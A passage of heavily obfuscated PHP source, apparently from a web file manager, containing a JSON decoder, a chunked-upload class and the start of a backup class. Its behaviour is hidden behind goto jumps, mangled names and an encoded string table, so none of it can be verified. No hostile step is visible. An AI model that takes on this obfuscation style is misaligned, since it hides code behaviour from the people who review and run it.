.= substr($DÎëÀŞª¢ˆ, $Bå¨å¾ÓùÜ, 6); $Bå¨å¾ÓùÜ += 5; break; } } return $E¹‰¿ÕáõÜ; } elseif (preg_match($a¿İŞÓÆÙ[1959], $e¬ù­¶¿ ) || preg_match($a¿İŞÓÆÙ[1960], $e¬ù­¶¿ )) { goto BèÛËöí‚×; fƒ §¹Á¤œ: for ($Bå¨å¾ÓùÜ = 0; $Bå¨å¾ÓùÜ <= $f¶£ÒÃ“ƒØ; ++$Bå¨å¾ÓùÜ) { $AÒ„Œ‹­«Æ = end($d¿ÏøÛÚÂ‚); $c¢‰‰ùª×× = substr($DÎëÀŞª¢ˆ, $Bå¨å¾ÓùÜ, 2); if ($Bå¨å¾ÓùÜ == $f¶£ÒÃ“ƒØ || $DÎëÀŞª¢ˆ[$Bå¨å¾ÓùÜ] == $a¿İŞÓÆÙ[47] && $AÒ„Œ‹­«Æ[$a¿İŞÓÆÙ[1961]] == SERVICES_JSON_SLICE) { $fÉ©š‹È³ù = substr($DÎëÀŞª¢ˆ, $AÒ„Œ‹­«Æ[$a¿İŞÓÆÙ[263]], $Bå¨å¾ÓùÜ - $AÒ„Œ‹­«Æ[$a¿İŞÓÆÙ[263]]); array_push($d¿ÏøÛÚÂ‚, array($a¿İŞÓÆÙ[1961] => SERVICES_JSON_SLICE, $a¿İŞÓÆÙ[263] => $Bå¨å¾ÓùÜ + 1, $a¿İŞÓÆÙ[1962] => !1)); if (reset($d¿ÏøÛÚÂ‚) == SERVICES_JSON_IN_ARR) { array_push($eğºÅåğ…ë, $this->decode($fÉ©š‹È³ù)); } elseif (reset($d¿ÏøÛÚÂ‚) == SERVICES_JSON_IN_OBJ) { $AÏØ×®Ç… = array(); if (preg_match($a¿İŞÓÆÙ[1963], $fÉ©š‹È³ù, $AÏØ×®Ç…)) { $bÁÑŠåĞõ‚ = $this->decode($AÏØ×®Ç…[1]); $FÄéÏã©Ø = $this->decode($AÏØ×®Ç…[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $a¤¬ëÚ²º[$bÁÑŠåĞõ‚] = $FÄéÏã©Ø; } else { $a¤¬ëÚ²º->{$bÁÑŠåĞõ‚} = $FÄéÏã©Ø; } } elseif (preg_match($a¿İŞÓÆÙ[1964], $fÉ©š‹È³ù, $AÏØ×®Ç…)) { $bÁÑŠåĞõ‚ = $AÏØ×®Ç…[1]; $FÄéÏã©Ø = $this->decode($AÏØ×®Ç…[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $a¤¬ëÚ²º[$bÁÑŠåĞõ‚] = $FÄéÏã©Ø; } else { $a¤¬ëÚ²º->{$bÁÑŠåĞõ‚} = $FÄéÏã©Ø; } } } } elseif (($DÎëÀŞª¢ˆ[$Bå¨å¾ÓùÜ] == $a¿İŞÓÆÙ[113] || $DÎëÀŞª¢ˆ[$Bå¨å¾ÓùÜ] == $a¿İŞÓÆÙ[55]) && $AÒ„Œ‹­«Æ[$a¿İŞÓÆÙ[1961]] != SERVICES_JSON_IN_STR) { array_push($d¿ÏøÛÚÂ‚, array($a¿İŞÓÆÙ[1961] => SERVICES_JSON_IN_STR, $a¿İŞÓÆÙ[263] => $Bå¨å¾ÓùÜ, $a¿İŞÓÆÙ[1962] => $DÎëÀŞª¢ˆ[$Bå¨å¾ÓùÜ])); } elseif ($DÎëÀŞª¢ˆ[$Bå¨å¾ÓùÜ] == $AÒ„Œ‹­«Æ[$a¿İŞÓÆÙ[1962]] && $AÒ„Œ‹­«Æ[$a¿İŞÓÆÙ[1961]] == SERVICES_JSON_IN_STR && (strlen(substr($DÎëÀŞª¢ˆ, 0, $Bå¨å¾ÓùÜ)) - strlen(rtrim(substr($DÎëÀŞª¢ˆ, 0, $Bå¨å¾ÓùÜ), $a¿İŞÓÆÙ[93]))) % 2 != 1) { array_pop($d¿ÏøÛÚÂ‚); } elseif ($DÎëÀŞª¢ˆ[$Bå¨å¾ÓùÜ] == $a¿İŞÓÆÙ[157] && in_array($AÒ„Œ‹­«Æ[$a¿İŞÓÆÙ[1961]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($d¿ÏøÛÚÂ‚, array($a¿İŞÓÆÙ[1961] => SERVICES_JSON_IN_ARR, $a¿İŞÓÆÙ[263] => $Bå¨å¾ÓùÜ, $a¿İŞÓÆÙ[1962] => !1)); } elseif ($DÎëÀŞª¢ˆ[$Bå¨å¾ÓùÜ] == $a¿İŞÓÆÙ[478] && $AÒ„Œ‹­«Æ[$a¿İŞÓÆÙ[1961]] == SERVICES_JSON_IN_ARR) { array_pop($d¿ÏøÛÚÂ‚); } elseif ($DÎëÀŞª¢ˆ[$Bå¨å¾ÓùÜ] == $a¿İŞÓÆÙ[1066] && in_array($AÒ„Œ‹­«Æ[$a¿İŞÓÆÙ[1961]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($d¿ÏøÛÚÂ‚, array($a¿İŞÓÆÙ[1961] => SERVICES_JSON_IN_OBJ, $a¿İŞÓÆÙ[263] => $Bå¨å¾ÓùÜ, $a¿İŞÓÆÙ[1962] => !1)); } elseif ($DÎëÀŞª¢ˆ[$Bå¨å¾ÓùÜ] == $a¿İŞÓÆÙ[315] && $AÒ„Œ‹­«Æ[$a¿İŞÓÆÙ[1961]] == SERVICES_JSON_IN_OBJ) { array_pop($d¿ÏøÛÚÂ‚); } elseif ($c¢‰‰ùª×× == $a¿İŞÓÆÙ[1965] && in_array($AÒ„Œ‹­«Æ[$a¿İŞÓÆÙ[1961]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($d¿ÏøÛÚÂ‚, array($a¿İŞÓÆÙ[1961] => SERVICES_JSON_IN_CMT, $a¿İŞÓÆÙ[263] => $Bå¨å¾ÓùÜ, $a¿İŞÓÆÙ[1962] => !1)); $Bå¨å¾ÓùÜ++; } elseif ($c¢‰‰ùª×× == $a¿İŞÓÆÙ[1966] && $AÒ„Œ‹­«Æ[$a¿İŞÓÆÙ[1961]] == SERVICES_JSON_IN_CMT) { array_pop($d¿ÏøÛÚÂ‚); $Bå¨å¾ÓùÜ++; for ($C¸¡¸øîêĞ = $AÒ„Œ‹­«Æ[$a¿İŞÓÆÙ[263]]; $C¸¡¸øîêĞ <= $Bå¨å¾ÓùÜ; ++$C¸¡¸øîêĞ) { $DÎëÀŞª¢ˆ = substr_replace($DÎëÀŞª¢ˆ, $a¿İŞÓÆÙ[50], $C¸¡¸øîêĞ, 1); } } } if (reset($d¿ÏøÛÚÂ‚) == SERVICES_JSON_IN_ARR) { return $eğºÅåğ…ë; } elseif (reset($d¿ÏøÛÚÂ‚) == SERVICES_JSON_IN_OBJ) { return $a¤¬ëÚ²º; } goto B“Á™…ãÁ¦; f‘—ô†ŸÒ±: $DÎëÀŞª¢ˆ = $this->reduce_string($DÎëÀŞª¢ˆ); if ($DÎëÀŞª¢ˆ == $a¿İŞÓÆÙ[33]) { if (reset($d¿ÏøÛÚÂ‚) == SERVICES_JSON_IN_ARR) { return $eğºÅåğ…ë; } else { return $a¤¬ëÚ²º; } } $f¶£ÒÃ“ƒØ = strlen($DÎëÀŞª¢ˆ); goto fƒ §¹Á¤œ; BèÛËöí‚×: if ($e¬ù­¶¿ [0] == $a¿İŞÓÆÙ[157]) { $d¿ÏøÛÚÂ‚ = array(SERVICES_JSON_IN_ARR); $eğºÅåğ…ë = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $d¿ÏøÛÚÂ‚ = array(SERVICES_JSON_IN_OBJ); $a¤¬ëÚ²º = array(); } else { $d¿ÏøÛÚÂ‚ = array(SERVICES_JSON_IN_OBJ); $a¤¬ëÚ²º = new stdClass(); } } array_push($d¿ÏøÛÚÂ‚, array($a¿İŞÓÆÙ[1961] => SERVICES_JSON_SLICE, $a¿İŞÓÆÙ[263] => 0, $a¿İŞÓÆÙ[1962] => !1)); $DÎëÀŞª¢ˆ = substr($e¬ù­¶¿ , 1, -1); goto f‘—ô†ŸÒ±; B“Á™…ãÁ¦: } } } function isError($DÃ£ì¾ï, $e×¼ëºøå„ = null) { $C§éà‰éÊ× =& $_SERVER[Å¸ş]; if (class_exists($C§éà‰éÊ×[1967])) { return PEAR::isError($DÃ£ì¾ï, $e×¼ëºøå„); } elseif (is_object($DÃ£ì¾ï) && (get_class($DÃ£ì¾ï) == $C§éà‰éÊ×[1968] || is_subclass_of($DÃ£ì¾ï, $C§éà‰éÊ×[1968]))) { return !0; } return !1; } } if (class_exists($_SERVER[Å¸ş][1969])) { class Services_JSON_Error extends PEAR_Error { function __construct($a„Â¥´Äô = "\x75\156\x6b\156\157\167\156\40\x65\162\162\157\162", $D»ÑŒ¹¸İÊ = null, $e—…òÃÜºË = null, $C¥ë”¤™ÔÛ = null, $c‡Øéƒù = null) { parent::PEAR_Error($a„Â¥´Äô, $D»ÑŒ¹¸İÊ, $e—…òÃÜºË, $C¥ë”¤™ÔÛ, $c‡Øéƒù); } } } else { class Services_JSON_Error { function __construct($cÖÊƒ¡…­° = "\x75\156\x6b\x6e\157\x77\156\40\x65\x72\162\157\162", $dâß’ğãŠ = null, $aÒ¾‰…—†À = null, $D×£óöö… = null, $Eºß³Üõ¨ç = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto bŒ……Ëë¸•; fÕ•´ùöƒÒ: if (!empty($_FILES)) { $Fø¹ô–è© = $_FILES[$FÔËéŞ±‹ô[167]]; $this->uploadFile = $Fø¹ô–è©[$FÔËéŞ±‹ô[1970]]; if (!$this->uploadFile && $Fø¹ô–è©[$FÔËéŞ±‹ô[1217]] > 0) { show_json($this->errorInfo($Fø¹ô–è©[$FÔËéŞ±‹ô[1217]]), !1); } } else { if (isset($in[$FÔËéŞ±‹ô[386]])) { $this->uploadFile = isset($in[$FÔËéŞ±‹ô[1971]]) ? $FÔËéŞ±‹ô[1972] : $FÔËéŞ±‹ô[1815]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto F¯ÉğŸ¾Äó; bŒ……Ëë¸•: $FÔËéŞ±‹ô =& $_SERVER[Å¸ş]; global $in; $this->in =& $in; goto fÕ•´ùöƒÒ; F¯ÉğŸ¾Äó: $this->checkSize(); $this->tempPathInit(); goto FÆòøŠßÇæ; FÆòøŠßÇæ: } public function upload() { goto Bïâ®‚ø¾‰; EÁ»½‰²Ô: @unlink($Cä“™•‡ÀÍ); if (!$f–³…å×©°) { $this->showJson($eÔ™¿‘çø[1981] . $Cëó®ƒ˜ğ, !1); } $BË÷„©Ù[$eÔ™¿‘çø[1982]] = $FèŸÒº·—¬; goto FÖ‘•ŠŞÓ„; fÀ¬½¥¾×É: $f–³…å×©° = $this->writeTo($Cä“™•‡ÀÍ, $AÄî‡’†‰ˆ, $this->tempFile); $dÀŠ¨ç‚ò´ = IO::hashSimple($Cä“™•‡ÀÍ); $eó¯ÏÓöÉ× = IO::size($Cä“™•‡ÀÍ); goto EÁ»½‰²Ô; E»ïé³º‚¸: $Cä“™•‡ÀÍ = $this->moveUploadedFile($CÒô¡ñÜ·©); if ($eó¯ÏÓöÉ× > 0 && filesize($Cä“™•‡ÀÍ) == 0) { $this->showJson($eÔ™¿‘çø[1978], !1); } if (!$Cä“™•‡ÀÍ) { $this->showJson(LNG($eÔ™¿‘çø[1979]), !1); } goto D£âÇê„£; c»·‘ÙÀğ‚: if ($FèŸÒº·—¬ > 1 && $F—ñ·¶ˆ»ó <= 0) { show_json($eÔ™¿‘çø[1977], !1); } if ($F—ñ·¶ˆ»ó > $eó¯ÏÓöÉ×) { $FèŸÒº·—¬ = 1; } if ($FèŸÒº·—¬ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto B‰¿”Ãœ–; B‰¿”Ãœ–: CacheLock::lock($this->tempFile, 20); $BË÷„©Ù = $this->statusGet(); $this->initFileTemp(); goto E»ïé³º‚¸; FÖ‘•ŠŞÓ„: $BË÷„©Ù[$eÔ™¿‘çø[1983]][$eÔ™¿‘çø[1984] . $Cëó®ƒ˜ğ] = array($eÔ™¿‘çø[1985] => $Fèï˜Ç¯ò, $eÔ™¿‘çø[1034] => $Cëó®ƒ˜ğ, $eÔ™¿‘çø[77] => $eó¯ÏÓöÉ×, $eÔ™¿‘çø[164] => $dÀŠ¨ç‚ò´); $this->statusSet($BË÷„©Ù); if (count($BË÷„©Ù[$eÔ™¿‘çø[1983]]) != $BË÷„©Ù[$eÔ™¿‘çø[1982]]) { $this->showJson($eÔ™¿‘çø[1986] . $Cëó®ƒ˜ğ, !0); } goto D­ä¨ŒÎÜÙ; Eîµ÷²°: $CÒô¡ñÜ·© = $this->tempFile . $eÔ™¿‘çø[1975] . $Cëó®ƒ˜ğ; $eó¯ÏÓöÉ× = isset($this->in[$eÔ™¿‘çø[522]]) ? intval($this->in[$eÔ™¿‘çø[522]]) : 0; $F—ñ·¶ˆ»ó = isset($this->in[$eÔ™¿‘çø[1976]]) ? intval($this->in[$eÔ™¿‘çø[1976]]) : 0; goto c»·‘ÙÀğ‚; BÙ–‘é¸Í: CacheLock::unlock($this->tempFile); return $this->tempFile; goto c½ ·®ÆÓ; D£âÇê„£: $Fèï˜Ç¯ò = $Cëó®ƒ˜ğ * $F—ñ·¶ˆ»ó; $AÄî‡’†‰ˆ = @fopen($this->tempFile, $eÔ™¿‘çø[1980]); fseek($AÄî‡’†‰ˆ, $Fèï˜Ç¯ò); goto fÀ¬½¥¾×É; Bïâ®‚ø¾‰: $eÔ™¿‘çø =& $_SERVER[Å¸ş]; $Cëó®ƒ˜ğ = isset($this->in[$eÔ™¿‘çø[1973]]) ? intval($this->in[$eÔ™¿‘çø[1973]]) : 0; $FèŸÒº·—¬ = isset($this->in[$eÔ™¿‘çø[1974]]) ? intval($this->in[$eÔ™¿‘çø[1974]]) : 1; goto Eîµ÷²°; D­ä¨ŒÎÜÙ: ignore_timeout(); if (!$this->checkChunkHash($BË÷„©Ù)) { $this->showJson($eÔ™¿‘çø[1987], !1); } $this->statusSet(!1); goto BÙ–‘é¸Í; c½ ·®ÆÓ: } private function checkSize() { $F¨¦„ó–„ =& $_SERVER[Å¸ş]; if (phpBuild64() || $this->in[$F¨¦„ó–„[77]] < PHP_INT_MAX) { return; } show_json(LNG($F¨¦„ó–„[1988]), !1); } private function showJson($F§±ºÛÓ³», $dõ½ÁÀ‚Á) { CacheLock::unlock($this->tempFile); if (!$dõ½ÁÀ‚Á) { return show_json($F§±ºÛÓ³», $dõ½ÁÀ‚Á); } show_json($F§±ºÛÓ³», $dõ½ÁÀ‚Á); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto cÄ™©¨ÂÓ; cÄ™©¨ÂÓ: $DÀ¡š—÷î =& $_SERVER[Å¸ş]; $Fí®Š‹»óÀ = TEMP_FILES; @mk_dir($Fí®Š‹»óÀ); goto fŠÃ¨¶”Ó¦; bè¸óè¦§š: $this->tempFile = $Fí®Š‹»óÀ . $DÀ¡š—÷î[1991] . md5($C®Üµ˜ğôÕ . $this->in[$DÀ¡š—÷î[1531]]); goto Cš¥ÅÊ¹ÜÍ; fŠÃ¨¶”Ó¦: touch($Fí®Š‹»óÀ . $DÀ¡š—÷î[1989]); $C®Üµ˜ğôÕ = isset($this->in[$DÀ¡š—÷î[1990]]) ? $this->in[$DÀ¡š—÷î[1990]] : !1; if (strlen($C®Üµ˜ğôÕ) < 30) { $C®Üµ˜ğôÕ = md5(USER_ID . $this->in[$DÀ¡š—÷î[75]] . $this->fileName . $this->in[$DÀ¡š—÷î[77]]); } goto bè¸óè¦§š; Cš¥ÅÊ¹ÜÍ: } private function moveUploadedFile($cäŒ£­ğî§) { $Dˆ…ÕÇöí =& $_SERVER[Å¸ş]; $fó­÷„ñã… = $this->uploadFile; if ($fó­÷„ñã… == $Dˆ…ÕÇöí[1992]) { @file_put_contents($cäŒ£­ğî§, base64_decode($_REQUEST[$Dˆ…ÕÇöí[1993]])); } else { if ($fó­÷„ñã… == $Dˆ…ÕÇöí[1815]) { $D‚º¯ö‹õÜ = @fopen($cäŒ£­ğî§, $Dˆ…ÕÇöí[1521]); $this->writeTo($fó­÷„ñã…, $D‚º¯ö‹õÜ, $cäŒ£­ğî§); } else { if (!move_uploaded_file($fó­÷„ñã…, $cäŒ£­ğî§)) { return !1; } } } return $cäŒ£­ğî§; } private function writeTo($CÔÀÈÙ·, $fâ™…Ö»¤, $dóíĞÆçÉ™) { goto F¿£Ä†Æ·; F¿£Ä†Æ·: $aÍˆÊå—  =& $_SERVER[Å¸ş]; $Aø¤ö¸†Á = $aÍˆÊå— [1994] . $dóíĞÆçÉ™; $Eå‘¢­ = CacheLock::lock($Aø¤ö¸†Á, 1); goto d¹÷¸áçİ; Cº‚Šù¡„: return !0; goto dËó†ÛÓ‰Æ; d¹÷¸áçİ: $eã‚æÓà = @fopen($CÔÀÈÙ·, $aÍˆÊå— [1520]); if (!$eã‚æÓà || !$fâ™…Ö»¤ || !$Eå‘¢­) { CacheLock::unlock($Aø¤ö¸†Á); return !1; } while (!feof($eã‚æÓà)) { fwrite($fâ™…Ö»¤, fread($eã‚æÓà, 1024 * 200)); } goto b‰º’ø¼ˆ; b‰º’ø¼ˆ: fclose($eã‚æÓà); fclose($fâ™…Ö»¤); CacheLock::unlock($Aø¤ö¸†Á); goto Cº‚Šù¡„; dËó†ÛÓ‰Æ: } private function statusGet() { goto CÃİ©·¦›‰; a“«„ğÅªª: if (!$this->statusData) { $cñì·Ô›‘ë = array($dáÏâğÃ‡˜[28] => $this->fileName, $dáÏâğÃ‡˜[1982] => 0, $dáÏâğÃ‡˜[1983] => array()); $this->statusSet($cñì·Ô›‘ë); } return $this->statusData; goto f®çÜ™ÏÓ; CÃİ©·¦›‰: $dáÏâğÃ‡˜ =& $_SERVER[Å¸ş]; if (is_array($this->statusData)) { return $this->statusData; } $cºÂ…ñ°‘¿ = $this->tempFile . $dáÏâğÃ‡˜[1995]; goto dØËÓÅ‰ùï; dØËÓÅ‰ùï: $f•„¿­‘¢† = !1; if (file_exists($cºÂ…ñ°‘¿)) { $f•„¿­‘¢† = @file_get_contents($cºÂ…ñ°‘¿); } if ($f•„¿­‘¢†) { $this->statusData = json_decode($f•„¿­‘¢†, !0); } goto a“«„ğÅªª; f®çÜ™ÏÓ: } public function statusSet($Fµ¸ˆĞ¸) { $bËé¼èŒ°ª = $this->tempFile . $_SERVER[Å¸ş][1995]; if (!$Fµ¸ˆĞ¸) { if (file_exists($bËé¼èŒ°ª)) { @unlink($bËé¼èŒ°ª); } return !0; } $this->statusData = $Fµ¸ˆĞ¸; return file_put_contents($bËé¼èŒ°ª, json_encode($Fµ¸ˆĞ¸)); } private function initFileTemp() { $CêÙˆøÚê° =& $_SERVER[Å¸ş]; if (file_exists($this->tempFile)) { return; } $c®ßÜÀË’‰ = fopen($this->tempFile, $CêÙˆøÚê°[1996]); fseek($c®ßÜÀË’‰, $this->in[$CêÙˆøÚê°[77]] - 1, SEEK_SET); fwrite($c®ßÜÀË’‰, $CêÙˆøÚê°[470]); fclose($c®ßÜÀË’‰); } public function checkChunk() { goto BÙØ¹´ ; bÃ™…ŸÏ‹ë: return $dÒÇôÃ°‡Æ; goto bÎÕÃŞ¹Ûà; BÙØ¹´ : $Eß«ÙÍÏæœ =& $_SERVER[Å¸ş]; $dÒÇôÃ°‡Æ = array(); CacheLock::lock($this->tempFile); goto EˆĞÎ¢¿±Û; EˆĞÎ¢¿±Û: $b•ˆ¼†Ù¶İ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($b•ˆ¼†Ù¶İ[$Eß«ÙÍÏæœ[1983]] as $DÍŠôÒ) { $DÑïÖ°Ö§‡ = $DÍŠôÒ[$Eß«ÙÍÏæœ[164]]; if ($DÑïÖ°Ö§‡) { $dÒÇôÃ°‡Æ[$Eß«ÙÍÏæœ[1997] . $DÍŠôÒ[$Eß«ÙÍÏæœ[1034]]] = $DÑïÖ°Ö§‡; } } goto bÃ™…ŸÏ‹ë; bÎÕÃŞ¹Ûà: } private function checkChunkHash($aõ¢ŞÊºäº) { goto A‘—åÎŠæ‡; BÅÂĞëõùÆ: $CíÚğÍ°àğ = !0; foreach ($aõ¢ŞÊºäº[$e¢ñ†³Ş·[1983]] as $b¤½´´Ñ) { fseek($A‰·—·ø¼, $b¤½´´Ñ[$e¢ñ†³Ş·[1985]]); $C§†Íˆµ í = PathDriverStream::hash($A‰·—·ø¼, $b¤½´´Ñ[$e¢ñ†³Ş·[77]]); if ($b¤½´´Ñ[$e¢ñ†³Ş·[164]] != $C§†Íˆµ í) { $CíÚğÍ°àğ = !1; break; } } fclose($A‰·—·ø¼); goto BÒÛ÷íÄ•½; BÒÛ÷íÄ•½: return $CíÚğÍ°àğ; goto bÎ°ÎŸ¬ƒí; fÎ±™–ö±: $FÅä¼À©Ô = _get($this->in, $e¢ñ†³Ş·[1998]); if (strlen($FÅä¼À©Ô) == 32 && IO::hashSimple($this->tempFile) == $b÷Üò„¼ù && IO::hashMd5($this->tempFile) == $FÅä¼À©Ô) { return !0; } $A‰·—·ø¼ = fopen($this->tempFile, $e¢ñ†³Ş·[1168]); goto BÅÂĞëõùÆ; A‘—åÎŠæ‡: $e¢ñ†³Ş· =& $_SERVER[Å¸ş]; if (count($aõ¢ŞÊºäº[$e¢ñ†³Ş·[1983]]) != $aõ¢ŞÊºäº[$e¢ñ†³Ş·[1982]]) { return !1; } $b÷Üò„¼ù = _get($this->in, $e¢ñ†³Ş·[1990]); goto fÎ±™–ö±; bÎ°ÎŸ¬ƒí: } public static function fileName() { goto Aà¨¸¶˜¦; aã‰ÖĞ•: return KodIO::clear($B…Å°³¬™); goto EÇËö¡Îø‰; A½“Š”ˆ†Š: if (!empty($_FILES)) { $B…Å°³¬™ = $B…Å°³¬™ ? $B…Å°³¬™ : $_FILES[$D…ˆÜ½Ãõ¨[167]][$D…ˆÜ½Ãõ¨[386]]; } if (!is_wap()) { return KodIO::clear($B…Å°³¬™); } $C‰´´ˆø·˜ = strtotime($in[$D…ˆÜ½Ãõ¨[1999]]); goto Bñ‘…ƒ”®Ó; Bñ‘…ƒ”®Ó: $C‰´´ˆø·˜ = $C‰´´ˆø·˜ ? $C‰´´ˆø·˜ : time(); $dµáª¼ğ¦™ = strtolower($B…Å°³¬™); if ($dµáª¼ğ¦™ == $D…ˆÜ½Ãõ¨[2000] || $dµáª¼ğ¦™ == $D…ˆÜ½Ãõ¨[2001]) { $B…Å°³¬™ = date($D…ˆÜ½Ãõ¨[693], $C‰´´ˆø·˜) . $D…ˆÜ½Ãõ¨[70] . $in[$D…ˆÜ½Ãõ¨[77]] . $D…ˆÜ½Ãõ¨[1628]; } else { if ($dµáª¼ğ¦™ == $D…ˆÜ½Ãõ¨[2002]) { $B…Å°³¬™ = date($D…ˆÜ½Ãõ¨[693], $C‰´´ˆø·˜) . $D…ˆÜ½Ãõ¨[70] . $in[$D…ˆÜ½Ãõ¨[77]] . $D…ˆÜ½Ãõ¨[2003]; } } goto aã‰ÖĞ•; Aà¨¸¶˜¦: $D…ˆÜ½Ãõ¨ =& $_SERVER[Å¸ş]; global $in; $B…Å°³¬™ = isset($in[$D…ˆÜ½Ãõ¨[28]]) ? $in[$D…ˆÜ½Ãõ¨[28]] : $D…ˆÜ½Ãõ¨[33]; goto A½“Š”ˆ†Š; EÇËö¡Îø‰: } private function errorInfo($C©Ò¯ßŸõÛ) { $CØ³¡‰èÔ½ =& $_SERVER[Å¸ş]; $Aïèê³ôÒ = array($CØ³¡‰èÔ½[2004], $CØ³¡‰èÔ½[2005], $CØ³¡‰èÔ½[2006], $CØ³¡‰èÔ½[2007], $CØ³¡‰èÔ½[2008], $CØ³¡‰èÔ½[2009], $CØ³¡‰èÔ½[2010], $CØ³¡‰èÔ½[2011]); return $C©Ò¯ßŸõÛ . $CØ³¡‰èÔ½[4] . $Aïèê³ôÒ[$C©Ò¯ßŸõÛ]; } } goto cÜ«Ë•†…à; c¬¡³ò½„Š: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $f¢³»Šƒ³á =& $_SERVER[Å¸ş]; self::$name = date($f¢³»Šƒ³á[690]); if (!($còµòºŠÇä = Model($f¢³»Šƒ³á[691])->lastItem())) { $còµòºŠÇä = $this->initData(); } else { self::$name = $còµòºŠÇä[$f¢³»Šƒ³á[28]]; if ($còµòºŠÇä[$f¢³»Šƒ³á[692]] == $f¢³»Šƒ³á[83]) { self::$name = date($f¢³»Šƒ³á[693]); $eÀÇ£å¬Û– = 0; if (isset($còµòºŠÇä[$f¢³»Šƒ³á[281]][$f¢³»Šƒ³á[167]][$f¢³»Šƒ³á[419]])) { $eÀÇ£å¬Û– = (int) $còµòºŠÇä[$f¢³»Šƒ³á[281]][$f¢³»Šƒ³á[167]][$f¢³»Šƒ³á[419]]; } if ($còµòºŠÇä[$f¢³»Šƒ³á[28]] == self::$name) { Model($f¢³»Šƒ³á[691])->remove($còµòºŠÇä[$f¢³»Šƒ³á[367]]); } $còµòºŠÇä = $this->initData($eÀÇ£å¬Û–, $còµòºŠÇä[$f¢³»Šƒ³á[694]]); } else { $this->checkStore($còµòºŠÇä[$f¢³»Šƒ³á[694]]); } } self::$option = $còµòºŠÇä; } private function initData($bƒçœöæ = 0, $dƒÆé¯¾´ = '') { goto Aª¡ô‰êëµ; EÒóÕíßèù: $this->checkStore($E¥¨¤¬ÅƒÉ[$e’¿¿Ô¤ï¢[694]]); $e¼°£´Õ›† = array($e’¿¿Ô¤ï¢[694] => $E¥¨¤¬ÅƒÉ[$e’¿¿Ô¤ï¢[694]], $e’¿¿Ô¤ï¢[28] => self::$name, $e’¿¿Ô¤ï¢[692] => 0, $e’¿¿Ô¤ï¢[695] => $E¥¨¤¬ÅƒÉ[$e’¿¿Ô¤ï¢[695]], $e’¿¿Ô¤ï¢[281] => array($e’¿¿Ô¤ï¢[696] => array($e’¿¿Ô¤ï¢[692] => 0), $e’¿¿Ô¤ï¢[697] => array($e’¿¿Ô¤ï¢[692] => 0, $e’¿¿Ô¤ï¢[698] => 0, $e’¿¿Ô¤ï¢[699] => 0, $e’¿¿Ô¤ï¢[29] => $e’¿¿Ô¤ï¢[33]), $e’¿¿Ô¤ï¢[700] => array($e’¿¿Ô¤ï¢[692] => 0, $e’¿¿Ô¤ï¢[698] => 0, $e’¿¿Ô¤ï¢[699] => 0), $e’¿¿Ô¤ï¢[167] => array($e’¿¿Ô¤ï¢[692] => 0, $e’¿¿Ô¤ï¢[701] => 0, $e’¿¿Ô¤ï¢[702] => 0, $e’¿¿Ô¤ï¢[703] => 0, $e’¿¿Ô¤ï¢[704] => 0, $e’¿¿Ô¤ï¢[419] => $bƒçœöæ)), $e’¿¿Ô¤ï¢[705] => time(), $e’¿¿Ô¤ï¢[449] => 0); $a¹Î—Ï¼… = Model($e’¿¿Ô¤ï¢[691])->insert($e¼°£´Õ›†); goto EÛÔ¤ìØÍ; EÛÔ¤ìØÍ: $e¼°£´Õ›†[$e’¿¿Ô¤ï¢[367]] = $a¹Î—Ï¼…; return $e¼°£´Õ›†; goto F¨¡ã«»¸¡; Aª¡ô‰êëµ: $e’¿¿Ô¤ï¢ =& $_SERVER[Å¸ş]; $E¥¨¤¬ÅƒÉ = Model($e’¿¿Ô¤ï¢[691])->config(); if ($dƒÆé¯¾´ && $E¥¨¤¬ÅƒÉ[$e’¿¿Ô¤ï¢[694]] != $dƒÆé¯¾´) { $bƒçœöæ = 0; } goto EÒóÕíßèù; F¨¡ã«»¸¡: } private function checkStore($Eª©Í›Ä¾Î) { $BÍ‡»†‰¿ö =& $_SERVER[Å¸ş]; $FÂÙĞÜß‚” = Model($BÍ‡»†‰¿ö[706])->listData($Eª©Í›Ä¾Î); Model($BÍ‡»†‰¿ö[706])->checkConfig($FÂÙĞÜß‚”); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Å¸ş][691])->findByName(self::$name); } return self::$option; } public static function set($cäÛõ¸ÊŠ) { $b‰¦ÕµÖÃµ =& $_SERVER[Å¸ş]; $eÑÁèÉš·¨ = self::get(); foreach ($cäÛõ¸ÊŠ as $FøêƒÆĞÄš => $E»ĞÁ·®Õ) { $cµ²–½®Ú = explode($b‰¦ÕµÖÃµ[91], $FøêƒÆĞÄš); $Bãî†¤Ñß› = count($cµ²–½®Ú); switch ($Bãî†¤Ñß›) { case 1: $eÑÁèÉš·¨[$cµ²–½®Ú[0]] = $E»ĞÁ·®Õ; break; case 2: $eÑÁèÉš·¨[$cµ²–½®Ú[0]][$cµ²–½®Ú[1]] = $E»ĞÁ·®Õ; break; case 3: $eÑÁèÉš·¨[$cµ²–½®Ú[0]][$cµ²–½®Ú[1]][$cµ²–½®Ú[2]] = $E»ĞÁ·®Õ; break; } } Model($b‰¦ÕµÖÃµ[691])->update($eÑÁèÉš·¨[$b‰¦ÕµÖÃµ[367]], $eÑÁèÉš·¨); self::$option = $eÑÁèÉš·¨; return self::$option; } public function keep() { $dëŒ„åÜÖ =& $_SERVER[Å¸ş]; $cÛÌËÂŞõº = self::get(); if ($cÛÌËÂŞõº[$dëŒ„åÜÖ[281]][$dëŒ„åÜÖ[696]][$dëŒ„åÜÖ[692]] == $dëŒ„åÜÖ[83]) { return; } $this->backupKeep($cÛÌËÂŞõº); self::set(array($dëŒ„åÜÖ[707] => 1)); } private function backupKeep($dé ¢ë³Íä) { goto aÔù×–ÖàË; cø·£³È: $b¹ƒ”öÇÑ» = 0; $F‚”“¡ËØ = array(); foreach 